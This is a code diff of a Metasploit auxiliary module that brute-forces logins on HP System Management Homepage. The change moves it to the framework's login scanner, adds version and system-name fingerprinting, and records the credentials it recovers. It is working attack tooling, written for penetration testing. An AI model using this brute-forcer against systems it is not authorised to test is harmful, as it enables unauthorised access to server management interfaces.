@@ -4,6 +4,8 @@
 ##
 
 require 'msf/core'
+require 'metasploit/framework/login_scanner/smh'
+require 'metasploit/framework/credential_collection'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -21,81 +23,172 @@ class Metasploit3 < Msf::Auxiliary
       },
       'License'        => MSF_LICENSE,
       'Author'         => [ 'sinn3r' ],
-      'DefaultOptions' => { 'SSL' => true }
+      'DefaultOptions' =>
+        {
+          'SSL' => true,
+          'RPORT' => 2381,
+          'USERPASS_FILE' => File.join(Msf::Config.data_directory, "wordlists", "http_default_userpass.txt"),
+          'USER_FILE' => File.join(Msf::Config.data_directory, "wordlists", "unix_users.txt"),
+          'PASS_FILE' => File.join(Msf::Config.data_directory, "wordlists", "unix_passwords.txt")
+        }
     ))
-
-    register_options(
-      [
-        Opt::RPORT(2381),
-        OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
-          File.join(Msf::Config.data_directory, "wordlists", "http_default_userpass.txt") ]),
-        OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
-          File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
-        OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
-          File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt") ]),
-      ], self.class)
   end
 
-  def anonymous_access?
-    res = send_request_raw({'uri' => '/'})
+  def get_version(res)
+    if res
+      return res.body.scan(/smhversion = "HP System Management Homepage v([\d\.]+)"/i).flatten[0] || ''
+    end
+
+    ''
+  end
+
+  def is_version_tested?(version)
+    # As of Sep 4 2014, version 7.4 is the latest and that's the last one we've tested
+    if Gem::Version.new(version) < Gem::Version.new('7.5')
+      return true
+    end
+
+    false
+  end
+
+  def get_system_name(res)
+    if res
+      return res.body.scan(/fullsystemname = "(.+)"/i).flatten[0] || ''
+    end
+
+    ''
+  end
+
+  def anonymous_access?(res)
     return true if res and res.body =~ /username = "hpsmh_anonymous"/
     false
   end
 
-  def do_login(user, pass)
-    begin
-      res = send_request_cgi({
-        'method' => 'POST',
-        'uri'    => '/proxy/ssllogin',
-        'vars_post' => {
-          'redirecturl'         => '',
-          'redirectquerystring' => '',
-          'user'                => user,
-          'password'            => pass
-        }
-      })
+  def init_loginscanner(ip)
+    @cred_collection = Metasploit::Framework::CredentialCollection.new(
+      blank_passwords: datastore['BLANK_PASSWORDS'],
+      pass_file:       datastore['PASS_FILE'],
+      password:        datastore['PASSWORD'],
+      user_file:       datastore['USER_FILE'],
+      userpass_file:   datastore['USERPASS_FILE'],
+      username:        datastore['USERNAME'],
+      user_as_pass:    datastore['USER_AS_PASS']
+    )
 
-      if not res
-        vprint_error("#{peer} - Connection timed out")
-        return :abort
+    @scanner = Metasploit::Framework::LoginScanner::Smh.new(
+      host:               ip,
+      port:               rport,
+      uri:                datastore['URI'],
+      proxies:            datastore["PROXIES"],
+      cred_details:       @cred_collection,
+      stop_on_success:    datastore['STOP_ON_SUCCESS'],
+      connection_timeout: 5
+    )
+
+    @scanner.ssl         = datastore['SSL']
+    @scanner.ssl_version = datastore['SSLVERSION']
+  end
+
+ def do_report(ip, port, result)
+    service_data = {
+      address: ip,
+      port: port,
+      service_name: 'http',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      module_fullname: self.fullname,
+      origin_type: :service,
+      private_data: result.credential.private,
+      private_type: :password,
+      username: result.credential.public,
+    }.merge(service_data)
+
+    credential_core = create_credential(credential_data)
+
+    login_data = {
+      core: credential_core,
+      last_attempted_at: DateTime.now,
+      status: result.status
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
+  def bruteforce(ip)
+    @scanner.scan! do |result|
+      case result.status
+      when Metasploit::Model::Login::Status::SUCCESSFUL
+        print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}'"
+        do_report(ip, rport, result)
+        :next_user
+      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
+        print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
+        invalidate_login(
+            address: ip,
+            port: rport,
+            protocol: 'tcp',
+            public: result.credential.public,
+            private: result.credential.private,
+            realm_key: result.credential.realm_key,
+            realm_value: result.credential.realm,
+            status: result.status
+        )
+        :abort
+      when Metasploit::Model::Login::Status::INCORRECT
+        print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
+        invalidate_login(
+            address: ip,
+            port: rport,
+            protocol: 'tcp',
+            public: result.credential.public,
+            private: result.credential.private,
+            realm_key: result.credential.realm_key,
+            realm_value: result.credential.realm,
+            status: result.status
+        )
       end
-    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED
-      vprint_error("#{peer} - Failed to response")
-      return :abort
-    end
-
-    if res.headers['CpqElm-Login'].to_s =~ /success/
-      print_good("#{peer} - Successful login: '#{user}:#{pass}'")
-      report_auth_info({
-        :host  => rhost,
-        :port  => rport,
-        :sname => 'https',
-        :user  => user,
-        :pass  => pass,
-        :proof => "CpqElm-Login: #{res.headers['CpqElm-Login']}"
-      })
-
-      return :next_user
     end
   end
 
 
   def run_host(ip)
-    if anonymous_access?
-      print_status("#{peer} - No login necessary. Server allows anonymous access.")
+    res = send_request_cgi({
+      'uri' => '/cpqlogin.htm',
+      'method' => 'GET',
+      'vars_get' => {
+        'RedirectUrl' => '/cpqlogin',
+        'RedirectQueryString' => ''
+      }
+    })
+
+    version = get_version(res)
+    unless version.blank?
+      print_status("#{peer} - Version detected: #{version}")
+      unless is_version_tested?(version)
+        print_warning("#{peer} - You're running the module against a version we have not tested")
+      end
+    end
+
+    sys_name = get_system_name(res)
+    unless sys_name.blank?
+      print_status("#{peer} - System name detected: #{sys_name}")
+      report_note(
+        :host => ip,
+        :type => "system.name",
+        :data => sys_name
+      )
+    end
+
+    if anonymous_access?(res)
+      print_good("#{peer} - No login necessary. Server allows anonymous access.")
       return
     end
 
-    each_user_pass { |user, pass|
-      # Actually respect the BLANK_PASSWORDS option
-      next if not datastore['BLANK_PASSWORDS'] and pass.blank?
-
-      vprint_status("#{peer} - Trying: '#{user}:#{pass}'")
-      do_login(user, pass)
-    }
+    init_loginscanner(ip)
+    bruteforce(ip)
   end
 end
 
-=begin
-Tested: v6.3.1.24 upto v7.2.1.3
-=end
